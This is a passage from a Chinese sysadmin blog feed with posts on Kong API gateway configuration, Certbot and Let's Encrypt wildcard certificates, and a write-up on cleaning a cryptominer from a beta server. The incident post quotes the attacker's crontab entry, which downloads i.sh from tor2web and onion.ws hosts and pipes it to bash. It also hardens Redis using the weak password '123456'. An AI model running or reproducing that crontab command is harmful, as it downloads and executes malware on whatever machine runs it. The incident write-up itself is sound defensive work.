class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;created_at&quot;:1541232959,</span><br><span class="line">    &quot;strip_path&quot;:true,</span><br><span class="line">    &quot;hosts&quot;:[</span><br><span class="line">        &quot;m.betaapi.haoshiqi.net&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;preserve_host&quot;:false,</span><br><span class="line">    &quot;regex_priority&quot;:0,</span><br><span class="line">    &quot;updated_at&quot;:1541232959,</span><br><span class="line">    &quot;paths&quot;:null,</span><br><span class="line">    &quot;service&quot;:&#123;</span><br><span class="line">        &quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;methods&quot;:[</span><br><span class="line">        &quot;GET&quot;,</span><br><span class="line">        &quot;POST&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;protocols&quot;:[</span><br><span class="line">        &quot;http&quot;,</span><br><span class="line">        &quot;https&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;id&quot;:&quot;d4f02c14-0482-472c-9a4f-04361dd5f579&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是定义了paths:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA plugins]$ curl -i -XPOST --url http://localhost:8001/routes/ --data &apos;protocols[]=http&apos; --data &apos;protocols[]=https&apos; --data &apos;methods[]=GET&amp;methods[]=POST&apos; --data &apos;paths[]=/merchantapi&apos; --data &apos;hosts[]=m.betapai.haoshiqi.net&apos; --data &apos;service.id=bb45687e-7cf5-48b2-b3ae-6847e28736bf&apos;</span><br><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Date: Wed, 07 Nov 2018 10:26:00 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Server: kong/0.14.1</span><br><span class="line">Content-Length: 324</span><br><span class="line"></span><br><span class="line">&#123;&quot;created_at&quot;:1541586360,&quot;strip_path&quot;:true,&quot;hosts&quot;:[&quot;m.betapai.haoshiqi.net&quot;],&quot;preserve_host&quot;:false,&quot;regex_priority&quot;:0,&quot;updated_at&quot;:1541586360,&quot;paths&quot;:[&quot;\/merchantapi&quot;],&quot;service&quot;:&#123;&quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;&#125;,&quot;methods&quot;:[&quot;GET&quot;,&quot;POST&quot;],&quot;protocols&quot;:[&quot;http&quot;,&quot;https&quot;],&quot;id&quot;:&quot;a2bb14fd-6423-45bb-be60-5481bc5a3038&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>route的hosts字段不仅可以指定具体的域名,还可以配置通配符域名,或者更高级的正则写法.</p></blockquote><hr><h4 id="upstream配置"><a href="#upstream配置" class="headerlink" title="* upstream配置"></a>* upstream配置</h4><p>upstream的名字应该要和service的host匹配</p><p>可以看到定义upstream时,kong提供了很多默认参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -X POST --url http://localhost:8001/upstreams/ --data &apos;name=beta_background_server&apos;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;healthchecks&quot;:&#123;</span><br><span class="line">        &quot;active&quot;:&#123;</span><br><span class="line">            &quot;unhealthy&quot;:&#123;</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    429,</span><br><span class="line">                    404,</span><br><span class="line">                    500,</span><br><span class="line">                    501,</span><br><span class="line">                    502,</span><br><span class="line">                    503,</span><br><span class="line">                    504,</span><br><span class="line">                    505</span><br><span class="line">                ],</span><br><span class="line">                &quot;tcp_failures&quot;:0,</span><br><span class="line">                &quot;timeouts&quot;:0,</span><br><span class="line">                &quot;http_failures&quot;:0,</span><br><span class="line">                &quot;interval&quot;:0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;http_path&quot;:&quot;/&quot;,</span><br><span class="line">            &quot;healthy&quot;:&#123;</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    200,</span><br><span class="line">                    302</span><br><span class="line">                ],</span><br><span class="line">                &quot;interval&quot;:0,</span><br><span class="line">                &quot;successes&quot;:0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;timeout&quot;:1,</span><br><span class="line">            &quot;concurrency&quot;:10</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;passive&quot;:&#123;</span><br><span class="line">            &quot;unhealthy&quot;:&#123;</span><br><span class="line">                &quot;http_failures&quot;:0,</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    429,</span><br><span class="line">                    500,</span><br><span class="line">                    503</span><br><span class="line">                ],</span><br><span class="line">                &quot;tcp_failures&quot;:0,</span><br><span class="line">                &quot;timeouts&quot;:0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;healthy&quot;:&#123;</span><br><span class="line">                &quot;successes&quot;:0,</span><br><span class="line">                &quot;http_statuses&quot;:[</span><br><span class="line">                    200,</span><br><span class="line">                    201,</span><br><span class="line">                    202,</span><br><span class="line">                    203,</span><br><span class="line">                    204,</span><br><span class="line">                    205,</span><br><span class="line">                    206,</span><br><span class="line">                    207,</span><br><span class="line">                    208,</span><br><span class="line">                    226,</span><br><span class="line">                    300,</span><br><span class="line">                    301,</span><br><span class="line">                    302,</span><br><span class="line">                    303,</span><br><span class="line">                    304,</span><br><span class="line">                    305,</span><br><span class="line">                    306,</span><br><span class="line">                    307,</span><br><span class="line">                    308</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;created_at&quot;:1541233739783,</span><br><span class="line">    &quot;hash_on&quot;:&quot;none&quot;,</span><br><span class="line">    &quot;id&quot;:&quot;111dbaf7-0283-49ae-958e-7146ee0e4e33&quot;,</span><br><span class="line">    &quot;hash_on_cookie_path&quot;:&quot;/&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;beta_background_server&quot;,</span><br><span class="line">    &quot;hash_fallback&quot;:&quot;none&quot;,</span><br><span class="line">    &quot;slots&quot;:10000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="target配置"><a href="#target配置" class="headerlink" title="*target配置"></a>*target配置</h4><p>定义target时需要指定upstreams组件路径下,而且需要指定在哪个upstream的ID下配置targets.</p><blockquote><p>注意:后端的target真实服务器无论是域名还是IP地址,都需要指定端口号,默认端口号是8000</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -X POST --url http://localhost:8001/upstreams/111dbaf7-0283-49ae-958e-7146ee0e4e33/targets --data &apos;target=kong.beta.haoshiqi.net:80&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;created_at&quot;:1541234259931,</span><br><span class="line">    &quot;id&quot;:&quot;a40fb1b5-a739-4de7-8208-9eaa52c03c5e&quot;,</span><br><span class="line">    &quot;upstream_id&quot;:&quot;111dbaf7-0283-49ae-958e-7146ee0e4e33&quot;,</span><br><span class="line">    &quot;target&quot;:&quot;kong.beta.haoshiqi.net:80&quot;,</span><br><span class="line">    &quot;weight&quot;:100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我定义的target真实服务器是kong.beata.haoshiqi.net.这样一来访问m.betaapi.haoshiqi.net域名经过routes组件转交给services组件.然后services反代到upstreams里的真实target服务器.最终将请求转交到kong.beta.haoshiqi.net服务器</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;kong-API网关介绍及API接口配置&quot;&gt;&lt;a href=&quot;#kong-API网关介绍及API接口配置&quot; class=&quot;headerlink&quot; title=&quot;kong API网关介绍及API接口配置&quot;&gt;&lt;/a&gt;kong API网关介绍及API接口配置&lt;/h2&gt;&lt;p&gt;上一篇讲解了kong+cassandra的部署安装方法.接下来讲解一下kong的API配置.官网上也有详细的api介绍.&lt;/p&gt;
&lt;p&gt;下面简单讲解一下kong的各个api组件:&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-分布式&amp;消息队列" scheme="https://jesse.top/categories/Linux-%E5%88%86%E5%B8%83%E5%BC%8F-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
    
      <category term="kong" scheme="https://jesse.top/tags/kong/"/>
    
  </entry>
  
  <entry>
    <title>服务器中挖矿病毒</title>
    <link href="https://jesse.top/2018/10/19/Linux-Basic/Skills/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%AF%92+%E6%8C%96%E7%9F%BF+redis%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>https://jesse.top/2018/10/19/Linux-Basic/Skills/服务器中毒+挖矿+redis安全加固/</id>
    <published>2018-10-19T04:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.284Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BETA服务器中毒案例"><a href="#BETA服务器中毒案例" class="headerlink" title="BETA服务器中毒案例"></a>BETA服务器中毒案例</h2><p>周末发现公司的BETA服务器占用CPU非常非常高.利用htop查看发现一个很奇怪的进程名:ZXGcBt</p><p>第一直觉就是服务器可能遭受了攻击,被植入了可疑程序.</p><hr><h3 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤:"></a>解决步骤:</h3><a id="more"></a><p>1.试图找出该进程的父进程:</p><p>ps -ef | grep -i ZXGcBt</p><p>结果显示父进程为1.看来是一个独立的进程</p><p>2.通过该进程的PID找出该进程打开的文件,也就是程序的所在路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo lsof -p 27493</span><br><span class="line">COMMAND   PID USER   FD   TYPE     DEVICE SIZE/OFF       NODE NAME</span><br><span class="line">ZXGcBt  27493 root  cwd    DIR      253,1     4096          2 /</span><br><span class="line">ZXGcBt  27493 root  rtd    DIR      253,1     4096          2 /</span><br><span class="line">ZXGcBt  27493 root  txt    REG      253,1   198140     924524 /root/.x (deleted)</span><br><span class="line">ZXGcBt  27493 root    0r  FIFO        0,8      0t0 1782547852 pipe</span><br><span class="line">ZXGcBt  27493 root    1w   CHR        1,3      0t0       1028 /dev/null</span><br><span class="line">ZXGcBt  27493 root    2w   CHR        1,3      0t0       1028 /dev/null</span><br><span class="line">ZXGcBt  27493 root    3w   REG      253,1        6    2494781 /tmp/.X11-lock</span><br><span class="line">ZXGcBt  27493 root    5u  IPv4 1788320222      0t0        TCP DWD-BETA:46392-&gt;37.59.44.93:http (ESTABLISHED)</span><br></pre></td></tr></table></figure><p>可以看到该进程发起了一个http的链接.访问外部的http服务器</p><p>3.查看实际进程的符号链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo ls -l /proc/27493/exe</span><br><span class="line">lrwxrwxrwx 1 root root 0 Oct 20 17:46 /proc/27493/exe -&gt; /root/.x (deleted)</span><br></pre></td></tr></table></figure><p>4.查看定时任务,看看有没有什么可疑的自动运行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo crontab -l</span><br><span class="line">49 * * * * (wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.io/i.sh||wget -qO- -U- http://ddgsdk6oou6znsdn.tor2web.me/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.onion.ws/i.sh)|bash</span><br></pre></td></tr></table></figure><p>发现个非常可疑的定时任务.该任务会定期从网上下载i.sh脚本.然后用bash执行</p><p>5.删除这个定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo crontab -e</span><br><span class="line">crontab: installing new crontab</span><br><span class="line">crontab: error renaming /var/spool/cron/#tmp.DWD-BETA.XXXXAzSEpy to /var/spool/cron/root</span><br><span class="line">rename: Operation not permitted</span><br><span class="line">crontab: edits left in /tmp/crontab.TIdire</span><br><span class="line">[work@DWD-BETA ~]$ sudo crontab -l</span><br><span class="line">49 * * * * (wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.io/i.sh||wget -qO- -U- http://ddgsdk6oou6znsdn.tor2web.me/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.onion.ws/i.sh)|bash</span><br></pre></td></tr></table></figure><p>在crontab -e的命令行界面无法删除.</p><p>6.尝试删除crontab文件.也提示没有权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# ls -l /var/spool/cron/root </span><br><span class="line">-rw------- 1 root root 239 Oct 20 00:01 /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# vim /var/spool/cron/root </span><br><span class="line">[root@DWD-BETA ~]# rm -rf /var/spool/cron/root</span><br><span class="line">rm: cannot remove ‘/var/spool/cron/root’: Operation not permitted</span><br></pre></td></tr></table></figure></p><p>7.通过lsattr发现该文件有隐藏的i属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# lsattr /var/spool/cron/root</span><br><span class="line">----i--------e-- /var/spool/cron/root</span><br></pre></td></tr></table></figure></p><p>8.去掉隐藏属性.删除该文件.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# chattr -i /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# lsattr /var/spool/cron/root</span><br><span class="line">-------------e-- /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# rm -rf /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# ls -l /var/spool/cron/root </span><br><span class="line">ls: cannot access /var/spool/cron/root: No such file or directory</span><br></pre></td></tr></table></figure></p><blockquote><p>note:最好是进入crontab -e界面清空定时任务.而不是直接删除crontab文件</p></blockquote><p>9.删除该进程.发现该进程已经消失..而且CPU使用率大幅下降,回到正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep -i zxgcbt</span><br></pre></td></tr></table></figure></p><hr><h3 id="利用ansible检查其他所有服务器的定时任务-查看是否有可疑脚本"><a href="#利用ansible检查其他所有服务器的定时任务-查看是否有可疑脚本" class="headerlink" title="利用ansible检查其他所有服务器的定时任务,查看是否有可疑脚本"></a>利用ansible检查其他所有服务器的定时任务,查看是否有可疑脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ansible allserver -m shell -a  &apos;crontab -l&apos;</span><br><span class="line">ansible allserver -m shell -a  &quot;su - work -c &apos;crontab -l&apos;&quot;</span><br></pre></td></tr></table></figure><hr><p>网上搜了一下我的案例,发现很多人和我有同样的经历,并且都是通过redis的漏洞取得权限.</p><h3 id="加固redis的安全性"><a href="#加固redis的安全性" class="headerlink" title="加固redis的安全性"></a>加固redis的安全性</h3><p>1.修改侦听地址.最好不要侦听外网接口<br>2.给redis设置密码<br>3.修改默认侦听端口</p><p>编辑redis.cnf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo vim /etc/redis.conf</span><br><span class="line">#修改侦听地址为127.0.0.1.只允许本机访问</span><br><span class="line">bind 127.0.0.1</span><br><span class="line"></span><br><span class="line">#设置一个密码.密码为123456</span><br><span class="line">requirepass 123456</span><br></pre></td></tr></table></figure><p>重启redis进程.</p><p>此时就需要先验证密码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ redis-cli</span><br><span class="line">127.0.0.1:6379&gt; select 0</span><br><span class="line">(error) NOAUTH Authentication required.</span><br><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BETA服务器中毒案例&quot;&gt;&lt;a href=&quot;#BETA服务器中毒案例&quot; class=&quot;headerlink&quot; title=&quot;BETA服务器中毒案例&quot;&gt;&lt;/a&gt;BETA服务器中毒案例&lt;/h2&gt;&lt;p&gt;周末发现公司的BETA服务器占用CPU非常非常高.利用htop查看发现一个很奇怪的进程名:ZXGcBt&lt;/p&gt;
&lt;p&gt;第一直觉就是服务器可能遭受了攻击,被植入了可疑程序.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;解决步骤&quot;&gt;&lt;a href=&quot;#解决步骤&quot; class=&quot;headerlink&quot; title=&quot;解决步骤:&quot;&gt;&lt;/a&gt;解决步骤:&lt;/h3&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
    
      <category term="redis" scheme="https://jesse.top/tags/redis/"/>
    
      <category term="挖矿" scheme="https://jesse.top/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>Certbot管理Lets Encrypt证书的几个经验</title>
    <link href="https://jesse.top/2018/10/15/Linux-Basic/SSL/Certbot%E7%AE%A1%E7%90%86Lets%20Encrypt%E8%AF%81%E4%B9%A6%E7%9A%84%E5%87%A0%E4%B8%AA%E7%BB%8F%E9%AA%8C/"/>
    <id>https://jesse.top/2018/10/15/Linux-Basic/SSL/Certbot管理Lets Encrypt证书的几个经验/</id>
    <published>2018-10-15T09:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Certbot管理Lets-Encrypt证书的几个经验"><a href="#Certbot管理Lets-Encrypt证书的几个经验" class="headerlink" title="Certbot管理Lets Encrypt证书的几个经验"></a>Certbot管理Lets Encrypt证书的几个经验</h2><p>certbot提供了很多命令和插件申请,注销,续约letsencrypt的证书.使用非常方便.借鉴网上的一些小技巧,整理出了这篇文章.</p><p>后续如果有更多教训或者经验技巧,还会更新此篇文章.</p><a id="more"></a><p>–</p><h3 id="1-设置邮箱接收证书过期的通知"><a href="#1-设置邮箱接收证书过期的通知" class="headerlink" title="1.设置邮箱接收证书过期的通知"></a>1.设置邮箱接收证书过期的通知</h3><p>一张Let’s Encrypt 证书有效期是 90 天，有效期太短，Let’s Encrypt 会在证书快过期的时候，给 email地址发送证书快过期的通知。通过下列命令设置或者修改一个email地址:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ certbot-auto register --update-registration --email admin@example.com</span><br></pre></td></tr></table></figure><p>–</p><h3 id="2-安装certbot-auto"><a href="#2-安装certbot-auto" class="headerlink" title="2.安装certbot-auto"></a>2.安装certbot-auto</h3><p>certbot 和 certbot-auto 本质上没有区别，安装certbot-auto也非常简单:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://dl.eff.org/certbot-auto</span><br><span class="line">$ chmod a+x ./certbot-auto</span><br></pre></td></tr></table></figure><p>而如果是通过apt-get,yum等安装方式的话.安装的就是certbot工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install certbot</span><br></pre></td></tr></table></figure><p>–</p><h3 id="3-查看申请了哪些证书"><a href="#3-查看申请了哪些证书" class="headerlink" title="3.查看申请了哪些证书"></a>3.查看申请了哪些证书</h3><p>通过下列命令可以查看目前服务器上申请过的证书,以及证书所在路径,证书有效期等信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# certbot certificates</span><br><span class="line"></span><br><span class="line">Found the following certs:</span><br><span class="line">  Certificate Name: topic.dev.doweidu.com</span><br><span class="line">    Domains: topic.dev.doweidu.com</span><br><span class="line">    Expiry Date: 2019-01-09 08:22:20+00:00 (VALID: 85 days)</span><br><span class="line">    Certificate Path: /etc/letsencrypt/live/topic.dev.doweidu.com/fullchain.pem</span><br><span class="line">    Private Key Path: /etc/letsencrypt/live/topic.dev.doweidu.com/privkey.pem</span><br></pre></td></tr></table></figure><p>–</p><h3 id="3-注销证书"><a href="#3-注销证书" class="headerlink" title="3.注销证书"></a>3.注销证书</h3><p>如果域名证书不需要的话,可以将证书注销掉,但是最好不要使用rm直接删除证书文件.最好是用revoke选项通知LetsEncrypt注销证书.</p><p>注销证书命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@1264f80bcd97:~# ./certbot-auto revoke --cert-path /etc/letsencrypt/live/deploy.haoshiqi.net/cert.pem  --reason superseded</span><br></pre></td></tr></table></figure><p>–cert-path表示证书文件所在路径<br>–reason表示注销原因.superseded表示作废的意思</p><p>输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@1264f80bcd97:~# ./certbot-auto revoke --cert-path /etc/letsencrypt/live/deploy.haoshiqi.net/cert.pem  --reason superseded</span><br><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Would you like to delete the cert(s) you just revoked?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es (recommended)/(N)o: y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Deleted all files relating to certificate deploy.haoshiqi.net.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Congratulations! You have successfully revoked the certificate that was located</span><br><span class="line">at /etc/letsencrypt/live/deploy.haoshiqi.net/cert.pem</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Certbot管理Lets-Encrypt证书的几个经验&quot;&gt;&lt;a href=&quot;#Certbot管理Lets-Encrypt证书的几个经验&quot; class=&quot;headerlink&quot; title=&quot;Certbot管理Lets Encrypt证书的几个经验&quot;&gt;&lt;/a&gt;Certbot管理Lets Encrypt证书的几个经验&lt;/h2&gt;&lt;p&gt;certbot提供了很多命令和插件申请,注销,续约letsencrypt的证书.使用非常方便.借鉴网上的一些小技巧,整理出了这篇文章.&lt;/p&gt;
&lt;p&gt;后续如果有更多教训或者经验技巧,还会更新此篇文章.&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="SSL" scheme="https://jesse.top/categories/Linux-Basic/SSL/"/>
    
    
      <category term="SSL" scheme="https://jesse.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>letsencrypt配置通配符域名证书</title>
    <link href="https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypt%E9%85%8D%E7%BD%AE%E9%80%9A%E9%85%8D%E7%AC%A6%E5%9F%9F%E5%90%8D%E8%AF%81%E4%B9%A6/"/>
    <id>https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypt配置通配符域名证书/</id>
    <published>2018-10-15T03:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="letsencrypt配置通配符域名证书"><a href="#letsencrypt配置通配符域名证书" class="headerlink" title="letsencrypt配置通配符域名证书"></a>letsencrypt配置通配符域名证书</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在今年稍早些的时候,letsencrypt终于开始免费支持通配符域名证书了.但是只支持一个层级的通配主机域名.</p><p>比如我曾经踩过的坑:*.dev.xxx.com通配符域名证书并不能支持api.v3.dev.xxx.com这种三层子域名.</p><p>如果需要为api.v3.dev.xxx.com申请通配符证书,则还需要申请*.v3.dev.xxx.com通配符证书</p><a id="more"></a><p>–</p><h3 id="letsencryp通配符证书申请前提"><a href="#letsencryp通配符证书申请前提" class="headerlink" title="letsencryp通配符证书申请前提"></a>letsencryp通配符证书申请前提</h3><h4 id="ACME-V2版本要求"><a href="#ACME-V2版本要求" class="headerlink" title="ACME V2版本要求"></a>ACME V2版本要求</h4><p>为了实现通配符证书，Let’s Encrypt 对 ACME 协议的实现进行了升级，只有 v2 协议才能支持通配符证书。</p><p>也就是说任何客户端只要支持 ACME v2 版本，就可以申请通配符证书了，是不是很激动。</p><p>可以查看下自己惯用的客户端是不是支持 ACME v2 版本，官方介绍 Certbot 0.22.0 版本支持新的协议版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# ./certbot-auto --version</span><br><span class="line">certbot 0.27.1</span><br></pre></td></tr></table></figure><h4 id="验证域名所有权的方式"><a href="#验证域名所有权的方式" class="headerlink" title="验证域名所有权的方式"></a>验证域名所有权的方式</h4><p>Let’s Encrypt颁发证书的时候，需要校验域名的所有权，证明操作者有权利为该域名申请证书，目前支持三种验证方式：</p><p>dns-01：给域名添加一个 DNS TXT 记录。<br>http-01：在域名对应的 Web 服务器下放置一个 HTTP well-known URL 资源文件。<br>tls-sni-01：在域名对应的 Web 服务器下放置一个 HTTPS well-known URL 资源文件。  